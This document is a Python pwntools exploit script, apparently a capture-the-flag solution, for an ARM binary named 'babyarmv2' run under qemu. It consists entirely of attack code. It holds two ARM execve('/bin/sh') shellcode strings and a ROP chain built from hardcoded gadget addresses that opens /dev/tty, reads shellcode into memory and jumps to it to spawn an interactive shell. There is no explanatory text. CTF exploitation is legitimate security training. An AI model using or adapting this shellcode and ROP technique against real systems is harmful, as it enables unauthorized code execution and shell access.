#!/usr/bin/python
from pwn import *

sc = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
sc2= "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

#context.log_level='debug'
#s = process(['qemu-arm-static', '-g', '1234', './babyarmv2'], stdin=PTY, stdout=PTY)
s = process(['qemu-arm-static', './babyarmv2'], stdin=PTY, stdout=PTY)

pause()

elf             = ELF('./babyarmv2')
openn           = elf.symbols['open']
read            = elf.symbols['read']
write           = elf.symbols['write'] 
#pop_all         = 0x40620   #pop r0,r1,r2,r3,r4,lr
pop_r0_r4_pc    = 0x1f65c 
devtty          = 0x48c18
svc_pop_r7_pc   = 0x10914 + 1
pop_r7_pc       = 0x10916 + 1
pop_r1_pc       = 0x46b02 + 1

#open /dev/tty for stdin
payload  = 'a'*8
payload += p32(pop_r0_r4_pc)
payload += p32(devtty)
payload += p32(0)
payload += p32(pop_r1_pc)
payload += p32(0x2712)
payload += p32(pop_r7_pc)
payload += p32(0x5)
payload += p32(svc_pop_r7_pc)

#open /dev/tty again for stdout
payload += p32(0x5)
payload += p32(pop_r0_r4_pc)
payload += p32(devtty)
payload += p32(0)
payload += p32(svc_pop_r7_pc)

#read() /bin/sh or read shellcode
payload += p32(0x3) #sys_read
payload += p32(pop_r0_r4_pc)
payload += p32(0) #new_fd of stdin
payload += p32(0)
payload += p32(pop_r1_pc)
payload += p32(0x6d700)
payload += p32(svc_pop_r7_pc)

payload += p32(0)
payload += p32(0x6d700) #addr of sc

s.send(payload)
pause()
s.send(sc2)
s.interactive()
